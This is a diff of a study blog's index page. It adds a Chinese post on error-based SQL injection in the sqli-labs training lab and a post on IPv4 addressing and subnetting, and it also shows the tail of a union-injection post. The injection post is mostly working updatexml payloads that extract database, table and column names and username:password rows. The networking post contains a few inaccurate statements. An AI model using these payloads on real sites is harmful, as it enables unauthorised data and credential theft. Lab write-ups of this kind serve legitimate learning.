@@ -176,18 +176,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-count">28</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">119</span>
+        <span class="site-state-item-count">169</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -212,6 +212,171 @@
     </div>
 
     <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/" class="post-title-link" itemprop="url">Error Injection</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-07-08 22:00:00" itemprop="dateCreated datePublished" datetime="2026-07-08T22:00:00+08:00">2026-07-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-07-13 16:41:41" itemprop="dateModified" datetime="2026-07-13T16:41:41+08:00">2026-07-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/" itemprop="url" rel="index"><span itemprop="name">web-security</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/web-security/sql-injection/" itemprop="url" rel="index"><span itemprop="name">sql-injection</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <blockquote>
+<p>Environment: PHP 7.3.4 + MySQL 5.7.26<br>Lab: sqli-labs Less-5 &amp; Less-11</p>
+</blockquote>
+<h2 id="1-0-报错注入"><a href="#1-0-报错注入" class="headerlink" title="1.0 报错注入"></a>1.0 报错注入</h2><p><strong>01 逻辑原理:</strong></p>
+<ul>
+<li><p>当无union回显时,优先使用报错注入</p>
+</li>
+<li><p><code>updatexml</code> 函数在处理第二个参数（XPath 路径）时，若遇到非法 XPath 表达式会抛出错误，并将错误内容直接返回到页面</p>
+</li>
+</ul>
+<p><strong>02 报错注入Payload模板:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1[闭合符号] and updatexml(1, concat(0x7e, ([标量子查询]), 0x7e), 1) [注释]</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-1-手工注入流程"><a href="#1-1-手工注入流程" class="headerlink" title="1.1 手工注入流程"></a>1.1 手工注入流程</h3><p><strong>01 符号闭合, 确认报错</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;报错 | ?id=1&#x27;--+ 恢复</span><br></pre></td></tr></table></figure>
+
+<p><strong>02 爆库名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/1.png"></p>
+<p><strong>03 爆表名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>通过修改 <code>limit</code> 偏移量（<code>0,1</code> → <code>1,1</code> → …）可逐表爆出所有表名。此处以 <code>limit 3,1</code> 直接定位到第 4 个表(users)作为示例</p>
+</blockquote>
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/2.png"></p>
+<blockquote>
+<p>limit 3,1 第四个表为users</p>
+</blockquote>
+<p><strong>04 爆列名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/3.png"></p>
+<blockquote>
+<p><code>limit 1,1</code>, <code>limit 2,1</code> 分别为 username、password 字段</p>
+</blockquote>
+<p><strong>05 爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from security.users limit 0,1),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/4.png"></p>
+<blockquote>
+<p>使用 <code>limit</code> 逐行提取数据即可</p>
+</blockquote>
+<h3 id="1-2-报错长度限制与绕过"><a href="#1-2-报错长度限制与绕过" class="headerlink" title="1.2 报错长度限制与绕过"></a>1.2 报错长度限制与绕过</h3><p><code>updatexml</code> 的报错信息最长返回 32 个字符，使用 <code>group_concat</code> 聚合多行时极易被截断。常用两种绕过方式：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>Payload 特征</th>
+<th>优点</th>
+<th>缺点</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>逐行提取</td>
+<td><code>concat</code> + <code>limit 0,1</code> 递增</td>
+<td>稳定不截断</td>
+<td>需多次请求</td>
+</tr>
+<tr>
+<td>分段读取</td>
+<td><code>substr(group_concat(...), 1, 30)</code></td>
+<td>一次性聚合</td>
+<td>需手工拼接结果</td>
+</tr>
+</tbody></table>
+<h3 id="1-3-POST-报错注入（Less-11）"><a href="#1-3-POST-报错注入（Less-11）" class="headerlink" title="1.3 POST 报错注入（Less-11）"></a>1.3 POST 报错注入（Less-11）</h3><p>POST 场景只需将注释符改为 <code>#</code>，其余步骤完全一致, 例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-admin&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) #</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/5.png"></p>
+<ul>
+<li>或用 Burp Suite:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span>=-admin<span class="string">&#x27; and updatexml(1,concat(0x7e,database(),0x7e),1) # &amp;passwd=&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="/2026/07/08/web-security/sql-injection/2026-07-08-error-injection/6.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
 
     
 
@@ -596,6 +761,1535 @@
 <p><strong>07 爆数据</strong></p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(username,<span class="string">&#x27;:&#x27;</span>,password),<span class="keyword">null</span> <span class="keyword">from</span> security.users</span><br></pre></td></tr></table></figure>
 <p><img data-src="/2026/07/06/web-security/sql-injection/2026-07-06-union-injection/data.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://byroins.github.io/2026/04/05/network-basic/2026-04-05-ip/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/private/icon1.png">
+      <meta itemprop="name" content="Byron">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Byron">
+      <meta itemprop="description" content="Documenting vulnerability reproduction, SRC bug bounty write-ups, and custom penetration testing tools.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Byron">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/05/network-basic/2026-04-05-ip/" class="post-title-link" itemprop="url">网络通讯协议—IP</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-04-05 22:00:00" itemprop="dateCreated datePublished" datetime="2026-04-05T22:00:00+08:00">2026-04-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-10-13 20:44:22" itemprop="dateModified" datetime="2026-10-13T20:44:22+08:00">2026-10-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/" itemprop="url" rel="index"><span itemprop="name">network</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/network/ip/" itemprop="url" rel="index"><span itemprop="name">ip</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><h3 id="1-0-IP地址"><a href="#1-0-IP地址" class="headerlink" title="1.0 IP地址"></a>1.0 IP地址</h3><h4 id="1-0-1-IP地址进制表示"><a href="#1-0-1-IP地址进制表示" class="headerlink" title="1.0.1 IP地址进制表示"></a>1.0.1 IP地址进制表示</h4><ul>
+<li><p>IP地址由32bits二进制数字序列组成，分为4段，每段8位；</p>
+<p>最小值：00000000；最大值：11111111；对应的十进制为0和255；</p>
+</li>
+<li><p>为方便记忆，将序列转换为10进制，即点分十进制。</p>
+</li>
+</ul>
+<p><img data-src="/2026/04/05/network-basic/2026-04-05-ip/1.png"></p>
+<ul>
+<li><p>例如计算本机IP二进制表示信息：192.168.31.85</p>
+<p>思路：</p>
+<p>192&gt;128 &#x3D;&gt; 10000000; 192-128&#x3D;64 &#x3D;&gt; 01000000 第一段 &#x3D;&gt; 11000000</p>
+<p>168&gt;128 &#x3D;&gt; 10000000; 168-128&#x3D;40 &lt; 64; 40&gt;32…第二段 &#x3D;&gt; 10101000</p>
+<p>第三段 &#x3D;&gt; 00011111; 第四段 &#x3D;&gt; 01010101</p>
+<p>所以 192.168.31.85 &#x3D;&#x3D; 11000000.10101000.00011111.01010101(二进制)</p>
+</li>
+<li><p>逆向计算(二进制转十进制)</p>
+<p>10011111 &#x3D;&gt; x(10)?</p>
+<p>思路：利用逻辑运算方式，上一个例子中计算同样是按照此方式，只是将2^n转换成具体的数值计算</p>
+<p>2^7 + 2^4 + 2^3 + 2^2 + 2^1 + 2^0 &#x3D; 128+16+8+4+2+1 &#x3D; 159</p>
+</li>
+</ul>
+<h4 id="1-0-2-IP地址逻辑运算"><a href="#1-0-2-IP地址逻辑运算" class="headerlink" title="1.0.2 IP地址逻辑运算"></a>1.0.2 IP地址逻辑运算</h4><ul>
+<li><p><strong>逻辑与(AND)运算</strong>：求网络号</p>
+<p>规则：全为1才1，有0则0</p>
+<p>作用：用掩码将IP地址中主机位全部清零，只保留网络位，算出IP属于哪个子网</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  01010101 IP(85)</span></span><br><span class="line"><span class="comment">#  11111111 掩码(255)</span></span><br><span class="line"><span class="comment"># 与运算结果：01010101 -&gt; 85</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>逻辑或(OR)运算</strong>：求广播地址</p>
+<p>规则：有1则1</p>
+<p>作用：把主机位强制全置为 1，得到该网段的广播地址。</p>
+</li>
+</ul>
+<h3 id="2-0-网络地址分类"><a href="#2-0-网络地址分类" class="headerlink" title="2.0 网络地址分类"></a>2.0 网络地址分类</h3><h4 id="2-0-1-按IP地址范围划分"><a href="#2-0-1-按IP地址范围划分" class="headerlink" title="2.0.1 按IP地址范围划分"></a>2.0.1 按IP地址范围划分</h4><p>IP地址的数量(IPv4)：通过1.0可知  2^32 &#x3D; 4294967296 大约43亿个，范围为：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>~<span class="number">255.255.255.255</span> 十进制</span><br><span class="line"><span class="attribute">00000000</span>.<span class="number">00000000</span>.<span class="number">00000000</span>.<span class="number">00000000</span>~<span class="number">11111111</span>.<span class="number">11111111</span>.<span class="number">11111111</span>.<span class="number">11111111</span> 二进制</span><br></pre></td></tr></table></figure>
+
+<p>IP地址范围划分为5个类别，如下图</p>
+<p><img data-src="/2026/04/05/network-basic/2026-04-05-ip/2.png"></p>
+<p>ABC三类分配给互联网用户使用；D类作为组播使用；E类作为科学研究，作为预留地址保留</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.31.85/24 <span class="comment"># 网络位192.168.31.85 主机位85</span></span><br></pre></td></tr></table></figure>
+
+<p>具体地址划分为：</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>使用范围</th>
+<th>排除信息</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A类</td>
+<td>1.0.0.0~126.255.255.255</td>
+<td>0.0.0.0 和 127.0.0.0保留</td>
+</tr>
+<tr>
+<td>B类</td>
+<td>128.0.0.0~191.255.255.255</td>
+<td>128.0.0.0 和 191.255.0.0保留</td>
+</tr>
+<tr>
+<td>C类</td>
+<td>192.0.0.0~223.255.255.255</td>
+<td>192.0.0.0 和 223.255.255.0保留</td>
+</tr>
+<tr>
+<td>D类</td>
+<td>224.0.0.0~239.255.255.255</td>
+<td></td>
+</tr>
+<tr>
+<td>E类</td>
+<td>240.0.0.0~255.255.255.254</td>
+<td>255.255.255.255 用于广播</td>
+</tr>
+</tbody></table>
+<p>划分逻辑如上图，第一段网络位的划分决定了类别如：(规定前n位必须为xx)</p>
+<p>A类 0N..规定了A类地址范围：1~127                          </p>
+<p>B类 10N.. B类地址范围：        128~191</p>
+<p>C类 110N.. C类地址范围：      192~223</p>
+<p>D类 1110…                                224~239</p>
+<p>E类 1111                                    240~255</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 特殊IP地址说明</span></span><br><span class="line">127.0.0.1       <span class="comment"># 表示回环地址，进行测试使用，验证本地的TCP协议簇安装的是否正确。</span></span><br><span class="line">0.0.0.0         <span class="comment"># 主机位全为0的称为是网络地址（网段地址）</span></span><br><span class="line">255.255.255.255 <span class="comment"># 主机位全为1的称为是广播地址，即向所有人发出信息</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-0-网络地址子网划分"><a href="#3-0-网络地址子网划分" class="headerlink" title="3.0 网络地址子网划分"></a>3.0 网络地址子网划分</h3><h4 id="3-0-1-网络掩码概念"><a href="#3-0-1-网络掩码概念" class="headerlink" title="3.0.1 网络掩码概念"></a>3.0.1 网络掩码概念</h4><ul>
+<li><p>网络掩码与IP地址搭配使用，用于描述一个IP地址中的网络部分及主机部分，根据划分后的主机部分，随之可得出可拥有的主机范围；</p>
+</li>
+<li><p>网络掩码32bits，与32bits的IP地址相对应，掩码中为1的位对应IP地址中的网络位，掩码中为0的位对应IP地址中的主机位。(网络位1,主机位0)</p>
+<p><img data-src="/2026/04/05/network-basic/2026-04-05-ip/3.png"></p>
+</li>
+<li><p>常规A B C三种主类地址的掩码为：&#x2F;8（255.0.0.0） &#x2F;16（255.255.0.0）&#x2F;24（255.255.255.0）</p>
+<p>&#x2F;8如何得来？11111111 &#x3D;&gt; 255 &#x3D;&gt; 255.0.0.0 （&#x2F;n表示连续的几个1）</p>
+</li>
+</ul>
+<h4 id="3-0-2-子网划分"><a href="#3-0-2-子网划分" class="headerlink" title="3.0.2 子网划分"></a>3.0.2 子网划分</h4><p>根据掩码的变化进行子网划分，调整相应的主机位变为网络位，对主机位进行缩减，从而产生出子网位，随之生成多个子网；</p>
+<p><strong>案例</strong>：以B类地址：172.16.0.0&#x2F;16划分子网为例，默认B类掩码为&#x2F;16</p>
+<p><img data-src="/2026/04/05/network-basic/2026-04-05-ip/4.png"></p>
+<p>​     当掩码变为&#x2F;18后，即表示出现了子网划分，生成子网掩码：</p>
+<p><img data-src="/2026/04/05/network-basic/2026-04-05-ip/5.png"></p>
+<p><img data-src="/2026/04/05/network-basic/2026-04-05-ip/6.png"></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">## 案例一：</span></span><br><span class="line"></span><br><span class="line">192.168.10.0/27 如何划分子网？</span><br><span class="line">（1）可以划分几个子网？</span><br><span class="line">（2）每个子网网络信息？</span><br><span class="line">（3）每个子网掩码信息？</span><br><span class="line">（4）每个子网主机地址范围？</span><br><span class="line"></span><br><span class="line">分析：192.168.10.0 是一个C类IP地址，因为：192 转化为二进制=128+64 == 11000000 =110为C类地址范围</span><br><span class="line">则： 默认掩码为/24 255.255.255.0 11111111 11111111 11111111 00000000</span><br><span class="line">将掩码/24改为/27</span><br><span class="line">则：11111111.11111111.11111111.(111 00000) 255.255.255.224 --掩码</span><br><span class="line">（1）可划分子网信息及数量：000 001 010 011 100 101 110 111 共计8种 2^3 = 8</span><br><span class="line">（2）此时，在主机位（第四段）中，每个子网网络信息：</span><br><span class="line">192.168.10.0</span><br><span class="line">192.168.10.32</span><br><span class="line">192.168.10.64</span><br><span class="line">192.168.10.96</span><br><span class="line">192.168.10.128</span><br><span class="line">192.168.10.160</span><br><span class="line">192.168.10.192</span><br><span class="line">192.168.10.224</span><br><span class="line">（3）此时，每个子网掩码信息：</span><br><span class="line">255.255.255.224 注：8个子网掩码均为：255.255.255.224</span><br><span class="line">（4）子网主机地址范围：</span><br><span class="line">192.168.10.1~192.168.10.30</span><br><span class="line">192.168.10.33~192.168.10.62</span><br><span class="line">192.168.10.65~192.168.10.94</span><br><span class="line">192.168.10.97~192.168.10.126</span><br><span class="line">192.168.10.129~192.168.10.158</span><br><span class="line">192.168.10.161~192.168.10.190</span><br><span class="line">192.168.10.193~192.168.10.222</span><br><span class="line">192.168.10.225~192.168.10.254</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">## 案例二：</span></span><br><span class="line"></span><br><span class="line">某企业内网使用 172.16.0.0/16。管理层要求为 4 个部门 分配子网，且满足以下条件：</span><br><span class="line">研发部：需要大约 4000 个可用主机地址</span><br><span class="line">测试部：需要大约 2000 个可用主机地址</span><br><span class="line">行政部：需要大约 1000 个可用主机地址</span><br><span class="line">运维部：需要大约 500 个可用主机地址</span><br><span class="line">请按从大到小的顺序（先分研发，再测试、行政、运维），为每个部门划分子网，并给出：</span><br><span class="line">每个部门子网的 CIDR 表示（网段/斜杠）</span><br><span class="line">每个部门子网的子网掩码（十进制）</span><br><span class="line">每个部门子网的可用主机地址范围</span><br><span class="line">最后剩余未分配的最小连续地址块是什么</span><br><span class="line"></span><br><span class="line">分析1：该网络地址 172=128+0+32+0+8+4=172 10101100 =&gt; 10 属于B类地址</span><br><span class="line">则 第一二段为网络位，第三四段为主机位，标准ip表示形式：172.16.0.0/16</span><br><span class="line">转化为二进制表示形式为：</span><br><span class="line">10101100.00010000.00000000.00000000</span><br><span class="line">11111111.11111111.00000000.00000000 =&gt; 掩码 ：255.255.0.0</span><br><span class="line">划分子网也就是需要掩码改变，相当于是掩码占用主机位。向主机位移动。</span><br><span class="line">可用主机数量：2^16=65536 排除网络地址.0和广播地址.255，实际可用主机地址：65534个</span><br><span class="line">分析2:研发需要4000个主机地址，2^n &gt;= 4000+2 ,n取值12 ，因为2^12= 4096 符合。主机位占用12</span><br><span class="line">则掩码需要向右移4位，也就是(1111)0000.00000000</span><br><span class="line">此时，研发部门子网掩码为：255.255.240.0，也就是/20 </span><br><span class="line">可划分子网：2^4 = 16个</span><br><span class="line">子网网络信息为：</span><br><span class="line">172.16.0.0 172.16.16.0</span><br><span class="line">可用主机范围：</span><br><span class="line">172.16.0.1~172.16.15.254</span><br><span class="line">分16段，每段理论0~255，256台主机，排除全0网络号和全1广播号 16<span class="emphasis">*256-2=4094个可用主机</span></span><br><span class="line"><span class="emphasis">以上（1）研发部门子网CIDR：172.16.0.0/20（2）子网掩码：255.255.240.0（3）可用主机地址范围如上。</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">分析2：测试部门此时IP从172.16.16.0开始</span></span><br><span class="line"><span class="emphasis">需求为2000台主机，2台为网络，广播号 则理论需求为2002台</span></span><br><span class="line"><span class="emphasis">2^n &gt;= 2002 n = 11 2^11= 2048 满足需求 则子网划分时需要11个主机位，其他均为网络位</span></span><br><span class="line"><span class="emphasis">此时将条件转化为二进制表示（172.16.16.0和掩码信息）如下：</span></span><br><span class="line"><span class="emphasis">10101100.00010000.(00010)000.00000000</span></span><br><span class="line"><span class="emphasis">11111111.11111111.(11111)000.00000000 =&gt;掩码：255.255.248.0</span></span><br><span class="line"><span class="emphasis">CIRD表示：172.16.16.0/21</span></span><br><span class="line"><span class="emphasis">子网划分：从00010开始， 00011是第二个子网</span></span><br><span class="line"><span class="emphasis">子网网络信息：172.16.16.0 172.16.24.0</span></span><br><span class="line"><span class="emphasis">可用主机范围：172.16.16.1~172.16.23.254</span></span><br><span class="line"><span class="emphasis">共计(16~23)8段，2046台可用主机，其中172.16.16.0为网络号，172.16.23.255为广播号</span></span><br><span class="line"><span class="emphasis">以上（1）测试部门子网CIDR：172.16.16.0/21（2）子网掩码：255.255.248.0（3）可用主机地址范围如上。</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">分析3：行政部门IP从172.16.24.0开始</span></span><br><span class="line"><span class="emphasis">需求1000台可用主机，2台为网络，广播号 则理论需求为1002台</span></span><br><span class="line"><span class="emphasis">2^n &gt;= 1002 n = 10 2^10= 1024 满足需求 则子网划分时需要10个主机位，其他均为网络位</span></span><br><span class="line"><span class="emphasis">此时将条件转化为二进制表示（172.16.24.0和掩码信息）如下：</span></span><br><span class="line"><span class="emphasis">10101100.00010000.(000110)00.00000000</span></span><br><span class="line"><span class="emphasis">11111111.11111111.(111111)00.00000000 =&gt; 掩码：255.255.252.0</span></span><br><span class="line"><span class="emphasis">CIRD表示：172.16.24.0/22</span></span><br><span class="line"><span class="emphasis">子网划分：172.16.24.0 172.16.28.0</span></span><br><span class="line"><span class="emphasis">可用主机范围：172.16.24.1~172.16.27.254</span></span><br><span class="line"><span class="emphasis">共计(24~27)4段，1022台可用主机</span></span><br><span class="line"><span class="emphasis">以上（1）行政部门子网CIDR：172.16.24.0/22（2）子网掩码：255.255.252.0（3）可用主机地址范围如上。</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">分析4：运维部此时IP从172.16.28.0开始</span></span><br><span class="line"><span class="emphasis">需求主机为500台，2台为网络，广播号 则理论需求为502台</span></span><br><span class="line"><span class="emphasis">2^n &gt;= 502 n = 9 2^9= 512 满足需求 则子网划分时需要9个主机位，其他均为网络位</span></span><br><span class="line"><span class="emphasis">此时将条件转化为二进制表示（172.16.28.0和掩码信息）如下：</span></span><br><span class="line"><span class="emphasis">10101100.00010000.(0001110)0.00000000</span></span><br><span class="line"><span class="emphasis">11111111.11111111.(1111111)0.00000000 =&gt; 掩码：255.255.254.0</span></span><br><span class="line"><span class="emphasis">CIRD表示：172.16.28.0/23</span></span><br><span class="line"><span class="emphasis">子网划分：172.16.28.0 172.16.30.0</span></span><br><span class="line"><span class="emphasis">可用主机范围：172.16.28.1~172.16.29.254</span></span><br><span class="line"><span class="emphasis">共计(28~29)2段，510台可用主机</span></span><br><span class="line"><span class="emphasis">以上（1）运维部门子网CIDR：172.16.28.0/23（2）子网掩码：255.255.254.0（3）可用主机地址范围如上。</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">剩余未划分地址：</span></span><br><span class="line"><span class="emphasis">172.16.30.0/23</span></span><br><span class="line"><span class="emphasis">172.16.30.0 172.16.32.0</span></span><br><span class="line"><span class="emphasis">172.16.30.1~172.16.31.254</span></span><br><span class="line"><span class="emphasis">最后剩余未分配的最小连续地址块为：172.16.30.1~172.16.31.254</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">再往后的大片空闲空间从 172.16.32.0 开始，一直延伸到 172.16.255.255</span></span><br><span class="line"><span class="emphasis">可以随意按需求划分</span></span><br><span class="line"><span class="emphasis"></span></span><br><span class="line"><span class="emphasis">名词：</span></span><br><span class="line"><span 